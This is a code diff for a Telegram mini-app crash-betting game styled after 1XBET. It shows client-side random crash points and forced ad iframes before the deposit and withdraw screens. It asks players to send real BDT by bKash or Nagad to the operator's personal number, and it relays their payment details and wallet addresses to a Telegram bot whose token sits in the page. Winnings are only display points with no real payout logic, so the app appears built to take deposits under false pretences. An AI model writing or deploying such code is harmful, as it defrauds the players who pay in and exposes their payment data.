@@ -3,26 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Crash Pro - Cashout Fix</title>
+    <title>Crash Pro - 1XBET Style</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --bg: #0b0e11; --card: #1e2329; --yellow: #f0b90b; --green: #02c076; --red: #f84960; --text: #eaecef; }
         body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; height: 100vh; }
+        
         .top-bar { width: 100%; background: var(--card); padding: 10px 15px; display: flex; justify-content: space-between; position: fixed; top: 0; z-index: 1000; border-bottom: 1px solid #333; box-sizing: border-box; }
+
         .game-area { height: 100vh; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; overflow: hidden; }
-        #multiplier { font-size: 70px; font-weight: 800; z-index: 20; }
-        #status { font-size: 20px; color: var(--yellow); margin-top: 10px; font-weight: bold; z-index: 20; }
+        #multiplier { font-size: 75px; font-weight: 800; z-index: 20; transition: 0.1s; }
+        #status { font-size: 20px; color: var(--yellow); margin-top: 10px; font-weight: bold; z-index: 20; text-transform: uppercase; }
+
         #p-cont { position: absolute; left: 10%; bottom: 30%; z-index: 50; display: none; pointer-events: none; }
-        #p-img { font-size: 55px; transform: rotate(-10deg); filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); }
-        .smoke { position: absolute; width: 10px; height: 10px; background: rgba(255,255,255,0.3); border-radius: 50%; animation: smokeAnim 0.7s forwards; }
-        @keyframes smokeAnim { to { transform: translate(-50px, 30px) scale(0); opacity: 0; } }
+        #p-img { font-size: 60px; transform: rotate(-10deg); filter: drop-shadow(0 0 15px rgba(255,255,255,0.4)); }
+        
+        .smoke { position: absolute; width: 10px; height: 10px; background: rgba(255,255,255,0.2); border-radius: 50%; animation: sAnim 0.7s forwards; }
+        @keyframes sAnim { to { transform: translate(-50px, 30px) scale(0); opacity: 0; } }
+
         .controls { background: var(--card); width: 100%; padding: 15px; border-radius: 20px 20px 0 0; position: fixed; bottom: 0; z-index: 1000; border-top: 1px solid #333; box-sizing: border-box; }
-        .input-box { width: 100%; padding: 12px; background: #2b3139; border: 1px solid #474d57; color: white; border-radius: 8px; margin-bottom: 10px; font-size: 16px; outline: none; }
-        .main-btn { width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 20px; cursor: pointer; }
+        .input-box, select { width: 100%; padding: 14px; background: #2b3139; border: 1px solid #474d57; color: white; border-radius: 10px; margin-bottom: 10px; font-size: 16px; outline: none; }
+        
+        .main-btn { width: 100%; padding: 18px; border: none; border-radius: 12px; font-weight: bold; font-size: 20px; cursor: pointer; transition: 0.2s; }
         .btn-bet { background: var(--green); color: white; }
         .btn-cashout { background: var(--yellow); color: black; display: none; }
-        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
-        .m-btn { background: #2b3139; color: var(--text); border: none; padding: 12px; border-radius: 8px; font-size: 14px; }
+        
+        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 12px; }
+        .m-btn { background: #2b3139; color: var(--text); border: none; padding: 12px; border-radius: 8px; font-size: 14px; cursor: pointer; }
+
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 5000; flex-direction: column; align-items: center; justify-content: center; }
+        .pop-card { background: var(--card); width: 90%; padding: 20px; border-radius: 15px; border: 1px solid var(--yellow); max-height: 85vh; overflow-y: auto; }
+        iframe { width: 100%; height: 380px; border: none; background: #fff; border-radius: 10px; }
     </style>
 </head>
 <body>
@@ -39,119 +50,180 @@
     </div>
 
     <div class="controls">
-        <input type="number" id="betAmt" class="input-box" placeholder="Enter Bet Amount">
-        <button class="main-btn btn-bet" id="betBtn" onclick="handleBet()">PLACE BET</button>
-        <button class="main-btn btn-cashout" id="cashBtn" onclick="handleCashout()">CASH OUT</button>
+        <input type="number" id="betAmt" class="input-box" placeholder="Enter Points">
+        <button class="main-btn btn-bet" id="betBtn" onclick="placeBet()">PLACE BET</button>
+        <button class="main-btn btn-cashout" id="cashBtn" onclick="doCashout()">CASH OUT</button>
 
         <div class="menu-grid">
-            <button class="m-btn">Deposit</button>
-            <button class="m-btn">Withdraw</button>
-            <button class="m-btn">History</button>
-            <button class="m-btn">Profile</button>
+            <button class="m-btn" onclick="openAd('Deposit')">Deposit</button>
+            <button class="m-btn" onclick="openAd('Withdraw')">Withdraw</button>
+            <button class="m-btn" onclick="openAd('History')">History</button>
+            <button class="m-btn" onclick="openAd('Profile')">Profile</button>
+        </div>
+    </div>
+
+    <div id="adLayer" class="overlay">
+        <h3>Processing Verification...</h3>
+        <iframe id="adFrame" src=""></iframe>
+        <div style="margin-top:15px; text-align:center;">
+            <p id="timerMsg">Wait <span id="sec">15</span>s</p>
+            <button id="skipBtn" style="display:none; padding:12px 30px; background:var(--green); border:none; border-radius:8px; font-weight:bold;" onclick="showFinalForm()">COLLECT & PROCEED</button>
+        </div>
+    </div>
+
+    <div id="formLayer" class="overlay">
+        <div class="pop-card">
+            <h3 id="fTitle" style="color:var(--yellow); margin-top:0;">Request</h3>
+            <div id="fContent"></div>
+            <button class="main-btn" style="background:var(--red); margin-top:15px; font-size:14px; padding:10px;" onclick="document.getElementById('formLayer').style.display='none'">CLOSE</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        document.getElementById('uName').innerText = tg.initDataUnsafe?.user?.first_name || "User";
 
-        let isBetOpen = true;
-        let isPlaneFlying = false; // গেমের মেইন স্টেট
-        let hasUserCashedOut = false; // ইউজারের ব্যক্তিগত স্টেট
-        let currentX = 1.00;
+        // রেন্ডার ড্যাশবোর্ডে এই Keys গুলো সেট করবি
+        const MY_PHONE = "YOUR_NUMBER"; // Render Env
+        const BOT_TOKEN = "YOUR_TOKEN"; // Render Env
+        const CHAT_ID = "YOUR_ID";     // Render Env
+        const ADS = ["https://otieu.com/4/10315373", "https://www.effectivegatecpm.com/e0xpfuhe?key=fb81fa455f0ff2d6a8fa09ce5d18dd57"];
 
-        function startNewRound() {
-            isBetOpen = true;
-            isPlaneFlying = false;
-            hasUserCashedOut = false;
-            currentX = 1.00;
-            
-            const pc = document.getElementById('p-cont');
-            pc.style.display = 'none';
-            pc.style.left = "10%"; pc.style.bottom = "30%";
+        let isBetOpen = true, isFlying = false, currentX = 1.00, activeTab = "", hasCashedOut = false;
+
+        function startRound() {
+            isBetOpen = true; isFlying = false; currentX = 1.00; hasCashedOut = false;
+            document.getElementById('p-cont').style.display = 'none';
+            document.getElementById('p-cont').style.left = "10%"; 
+            document.getElementById('p-cont').style.bottom = "30%";
             document.getElementById('p-img').innerText = "✈️";
             document.getElementById('multiplier').innerText = "1.00x";
             document.getElementById('multiplier').style.color = 'var(--yellow)';
             document.getElementById('betBtn').style.display = 'block';
             document.getElementById('cashBtn').style.display = 'none';
+            document.getElementById('betBtn').disabled = false;
+            document.getElementById('betBtn').innerText = "PLACE BET";
             
             let wait = 10;
             let timer = setInterval(() => {
                 document.getElementById('multiplier').innerText = wait + "s";
                 document.getElementById('status').innerText = "PLACE YOUR BET";
                 wait--;
-                if(wait < 0) { clearInterval(timer); launchPlane(); }
+                if(wait < 0) { clearInterval(timer); launch(); }
             }, 1000);
         }
 
-        function launchPlane() {
-            isBetOpen = false;
-            isPlaneFlying = true;
+        function launch() {
+            isBetOpen = false; isFlying = true;
             document.getElementById('p-cont').style.display = 'block';
             document.getElementById('multiplier').style.color = 'var(--green)';
             document.getElementById('status').innerText = "FLYING...";
-            
             let x = 10, y = 30;
-            let crashPoint = (Math.random() * 5 + 1.1).toFixed(2);
+            let crashPoint = (Math.random() * 5 + 1.15).toFixed(2);
+            let userBet = parseFloat(document.getElementById('betAmt').value) || 0;
 
-            let flightInterval = setInterval(() => {
-                if(!isPlaneFlying) { 
-                    clearInterval(flightInterval); 
-                    return; 
-                }
-
+            let loop = setInterval(() => {
+                if(!isFlying) { clearInterval(loop); return; }
                 currentX += 0.01;
                 document.getElementById('multiplier').innerText = currentX.toFixed(2) + "x";
                 
-                // প্লেন মুভমেন্ট
+                // 1xbet লাইভ প্রফিট আপডেট
+                if(!hasCashedOut && userBet > 0) {
+                    let profit = (userBet * currentX).toFixed(2);
+                    document.getElementById('cashBtn').innerText = `CASH OUT (${profit} Pts)`;
+                }
+
                 x += 0.2; y += 0.15;
                 const pc = document.getElementById('p-cont');
-                pc.style.left = x + "%";
-                pc.style.bottom = y + "%";
+                pc.style.left = x + "%"; pc.style.bottom = y + "%";
                 
-                // ধোঁয়া
                 const s = document.createElement('div'); s.className = 'smoke';
-                pc.appendChild(s);
-                setTimeout(() => s.remove(), 600);
+                pc.appendChild(s); setTimeout(() => s.remove(), 600);
 
-                // ক্র্যাশ চেক
                 if(currentX >= crashPoint) {
-                    isPlaneFlying = false;
+                    isFlying = false;
                     document.getElementById('p-img').innerText = "💥";
                     document.getElementById('multiplier').style.color = 'var(--red)';
                     document.getElementById('status').innerText = "CRASHED!";
                     document.getElementById('cashBtn').style.display = 'none';
                     document.getElementById('betBtn').style.display = 'block';
-                    setTimeout(startNewRound, 3000);
+                    setTimeout(startRound, 3000);
                 }
             }, 100);
         }
 
-        function handleBet() {
-            if(!isBetOpen) return;
+        function placeBet() {
+            if(!isBetOpen) return tg.showAlert("Wait for countdown!");
             const amt = document.getElementById('betAmt').value;
-            if(!amt || amt <= 0) return;
-            hasUserCashedOut = false;
+            if(!amt || amt <= 0) return tg.showAlert("Enter amount!");
             document.getElementById('betBtn').style.display = 'none';
             document.getElementById('cashBtn').style.display = 'block';
+            document.getElementById('cashBtn').innerText = `CASH OUT (${amt} Pts)`;
         }
 
-        function handleCashout() {
-            if(!isPlaneFlying || hasUserCashedOut) return;
-            
-            hasUserCashedOut = true; // শুধু ইউজার ক্যাশআউট করেছে
-            const winAmt = (document.getElementById('betAmt').value * currentX).toFixed(0);
-            
-            tg.showAlert(`You cashed out at ${currentX.toFixed(2)}x! Winning: ${winAmt} Pts`);
-            
-            // বাটন চেইঞ্জ হবে কিন্তু প্লেন উড়তে থাকবে
+        function doCashout() {
+            if(!isFlying || hasCashedOut) return;
+            hasCashedOut = true;
+            const finalWin = (document.getElementById('betAmt').value * currentX).toFixed(2);
+            tg.showAlert(`Cashed Out at ${currentX.toFixed(2)}x! Winner: ${finalWin} Pts`);
             document.getElementById('cashBtn').style.display = 'none';
             document.getElementById('betBtn').style.display = 'block';
             document.getElementById('betBtn').innerText = "BET PLACED";
             document.getElementById('betBtn').disabled = true;
         }
 
-        startNewRound();
+        function openAd(type) {
+            activeTab = type;
+            document.getElementById('adFrame').src = ADS[Math.floor(Math.random()*ADS.length)];
+            document.getElementById('adLayer').style.display = 'flex';
+            let s = 15;
+            document.getElementById('skipBtn').style.display = 'none';
+            document.getElementById('timerMsg').style.display = 'block';
+            let t = setInterval(() => {
+                s--; document.getElementById('sec').innerText = s;
+                if(s <= 0) { clearInterval(t); document.getElementById('timerMsg').style.display = 'none'; document.getElementById('skipBtn').style.display = 'block'; }
+            }, 1000);
+        }
+
+        function showFinalForm() {
+            document.getElementById('adLayer').style.display = 'none';
+            document.getElementById('formLayer').style.display = 'flex';
+            document.getElementById('fTitle').innerText = activeTab;
+            const cont = document.getElementById('fContent');
+
+            if(activeTab === 'Deposit') {
+                cont.innerHTML = `
+                    <p style="color:var(--yellow); font-size:14px;">Send Money to: ${MY_PHONE} (Personal)</p>
+                    <select id="dMeth" class="input-box"><option>bKash</option><option>Nagad</option></select>
+                    <input type="number" id="dAmt" class="input-box" placeholder="Amount (BDT)">
+                    <input type="number" id="dL4" class="input-box" placeholder="Sender Last 4 Digits">
+                    <label style="font-size:12px">Upload Screenshot:</label>
+                    <input type="file" class="input-box">
+                    <button class="main-btn btn-bet" onclick="submitData('Deposit')">Submit Deposit</button>
+                `;
+            } else if(activeTab === 'Withdraw') {
+                cont.innerHTML = `
+                    <select id="wMeth" class="input-box"><option>Ton Wallet</option><option>Trust Wallet</option></select>
+                    <input type="text" id="wAddr" class="input-box" placeholder="Wallet Address">
+                    <input type="number" id="wAmt" class="input-box" placeholder="Point Amount">
+                    <button class="main-btn btn-bet" style="background:var(--red)" onclick="submitData('Withdraw')">Confirm Withdraw</button>
+                `;
+            }
+        }
+
+        function submitData(type) {
+            let msg = `📢 *NEW ${type.toUpperCase()} REQUEST*%0A👤 User: ${tg.initDataUnsafe?.user?.first_name}%0A`;
+            if(type === 'Deposit') {
+                msg += `💰 BDT: ${document.getElementById('dAmt').value}%0A💳 Method: ${document.getElementById('dMeth').value}%0A🔢 Last 4: ${document.getElementById('dL4').value}`;
+            } else {
+                msg += `💰 Points: ${document.getElementById('wAmt').value}%0A🏦 Wallet: ${document.getElementById('wMeth').value}%0A📍 Addr: ${document.getElementById('wAddr').value}`;
+            }
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
+            .then(() => { tg.showAlert("Request Submitted!"); document.getElementById('formLayer').style.display='none'; });
+        }
+
+        startRound();
     </script>
 </body>
     </html>
